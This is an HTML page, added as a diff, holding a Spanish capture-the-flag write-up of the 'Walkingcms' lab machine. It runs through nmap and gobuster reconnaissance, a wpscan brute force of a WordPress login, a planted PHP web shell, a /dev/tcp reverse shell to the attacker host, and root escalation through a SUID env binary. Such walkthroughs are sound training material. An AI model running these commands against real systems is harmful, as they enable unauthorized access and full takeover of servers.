@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Write‑up: Walkingcms</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+
+<body class="bg-gray-900 text-white">
+    <!-- NAVBAR -->
+    <nav class="bg-gray-800 text-white sticky top-0 z-50 shadow-md">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex justify-between items-center h-16">
+            <div class="flex-shrink-0">
+            <h1 class="font-semibold">Santiago Lorenzo</h1>
+            </div>
+            <div class="hidden md:flex space-x-4">
+                <a href="../index.html#inicio" class="hover:text-blue-400 transition">Inicio</a>
+                <a href="../index.html#certificados" class="hover:text-blue-400 transition">Certificaciones</a>
+                <a href="../index.html#proyectos" class="hover:text-blue-400 transition">Proyectos</a>
+                <a href="../writeup.html" class="hover:text-blue-400 transition">Write‑ups</a>
+            </div>
+        </div>
+        </div>
+    </nav>
+
+    <main class="max-w-4xl mx-auto px-6 py-12">
+        <h1 class="text-4xl font-bold mb-2">❄️ Máquina: Walkingcms</h1>
+        <p class="text-gray-400 text-sm mb-8">📅 Publicado el 10/09/2025 | Categoría: LINUX </p>
+
+        <!-- DESCRIPCIÓN -->
+        <section class="mb-10">
+        <h2 class="text-2xl font-semibold mb-2">📝 Descripción</h2>
+        <p class="text-gray-300 leading-relaxed">
+            Reto en el cual tendremos que hacer fuerza bruta en un wordpress, crear una rever shell y finalizar con una 
+            escalada de privilegios a <code>root</code>.
+        </p>
+        </section>
+
+        <!-- RECON -->
+        <section class="mb-10">
+        <h2 class="text-2xl font-semibold mb-2">🔍 Reconocimiento</h2>
+        <pre><code class="language-bash">
+                sudo nmap -p- -open -O -sSC -min-rate 5000 -n -Pn 172.17.0.2
+
+                PORT   STATE SERVICE
+                80/tcp open  http
+                |_http-title: Apache2 Debian Default Page: It works
+
+            </code></pre>
+        <p class="text-gray-300">Para conocer mas de HTTP:</p>
+                <pre><code class="language-bash">
+                sudo nmap -p80 -O -sV 172.17.0.2
+
+                PORT   STATE SERVICE VERSION
+                80/tcp open  http    Apache httpd 2.4.57 ((Debian))
+                MAC Address: 02:42:AC:11:00:02 (Unknown)
+                Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+                Device type: general purpose|router
+                Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+                OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+                OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+            </code></pre>
+        </section>
+
+        <!-- WEB ENUM -->
+        <section class="mb-10">
+            <h2 class="text-2xl font-semibold mb-2">🌐 Enumeración Web</h2>
+            <pre><code class="language-bash">gobuster dir -u http://172.17.0.2/ 
+            -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+            -x php,html,txt -t 50
+
+                /index.php            (Status: 301) [Size: 0] [-> http://172.17.0.2/wordpress/]
+                /wp-content           (Status: 301) [Size: 323] [-> http://172.17.0.2/wordpress/wp-content/]
+                /license.txt          (Status: 200) [Size: 19903]
+                /wp-includes          (Status: 301) [Size: 324] [-> http://172.17.0.2/wordpress/wp-includes/]
+                /wp-login.php         (Status: 200) [Size: 7765]
+                /readme.html          (Status: 200) [Size: 7425]
+                /wp-trackback.php     (Status: 200) [Size: 136]
+                /wp-admin             (Status: 301) [Size: 321] [-> http://172.17.0.2/wordpress/wp-admin/]
+                /xmlrpc.php           (Status: 405) [Size: 42]
+            </code></pre>
+            
+            <p class="text-gray-300">El directorio <code>/wp-admin</code> nos importa porque en este podremos realizar fuerza bruta.</p>
+        </section>
+
+        <section class="mb-10">
+            <h2 class="text-2xl font-semibold mb-2">📦wpsacan</h2>
+            <pre><code class="language-bash">
+            wpscan --url http://172.17.0.2/wordpress/ --enumerate u
+            [i] User(s) Identified:
+
+            [+] mario
+
+            
+            wpscan --url http://172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt --password-attack wp-login
+
+            [!] Valid Combinations Found:
+            | Username: mario, Password: love
+
+            </code></pre>
+
+            <p class="text-gray-300">Ya tenenemos acceso</p>
+
+            <img src="../Assets/walkingcms/1-wordpress.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="inicio">
+
+            
+            <p class="text-gray-300">ahora modificamos el archivo fuctions.php para devolvernos una shell 
+            o se puede crear otro archivo que contenga(entre las etiquetas de php):
+            </p>
+            <pre><code class="language-bash">
+            
+            system($_GET['cmd']);
+            
+            </code></pre>
+
+            <img src="../Assets/walkingcms/2-shell.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="inicio">
+
+            <p class="text-gray-300">A continuación nos enviamos la Reverse shell a nuestra máquina atacante,
+            poniéndonos antes en escucha por el puerto 443 o el que prefieran con netcat:
+            </p>
+            <pre><code class="language-bash">
+            sudo nc -nlvp 443
+            </code></pre>
+                        <p class="text-gray-300">A continuación en la URL ponemos:
+            </p>
+            <pre><code class="language-bash">
+            http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/shell.php?cmd=bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
+            </code></pre>
+        </section>
+
+        <!-- ROOT -->
+        <section class="mb-10">
+        <h2 class="text-2xl font-semibold mb-2">👑 Escalada a root</h2>
+        <p class="text-gray-300">Miramos los premisos SUID</p>
+
+
+        <pre><code class="language-bash">
+            www-data@812b6b56379f:/$ find / \-perm -4000 2>/dev/null
+
+            /usr/bin/gpasswd
+            /usr/bin/su
+            /usr/bin/umount
+            /usr/bin/chfn
+            /usr/bin/newgrp
+            /usr/bin/passwd
+            /usr/bin/mount
+            /usr/bin/env
+            /usr/bin/chsh
+
+        </code></pre>
+
+        <pre><code class="language-bash">
+            www-data@812b6b56379f:/$ env /bin/sh -p
+        </code></pre>
+
+        <pre><code class="language-bash">
+            whoami
+            root
+        </code></pre>
+        </section>
+
+        <!-- RESULTADO -->
+        <section class="mb-12">
+        <h2 class="text-2xl font-semibold mb-2">🏁 Resultado</h2>
+        <p class="text-gray-300">Acceso total a la máquina con privilegios de <code>root</code>
+        </section>
+
+        <div class="mt-10">
+        <a href="../writeup.html" class="inline-block bg-blue-500 px-6 py-2 rounded-lg text-white hover:bg-blue-700 transition">
+            ← Volver a la lista de Write‑ups
+        </a>
+        </div>
+    </main>
+    </body>
+</html>
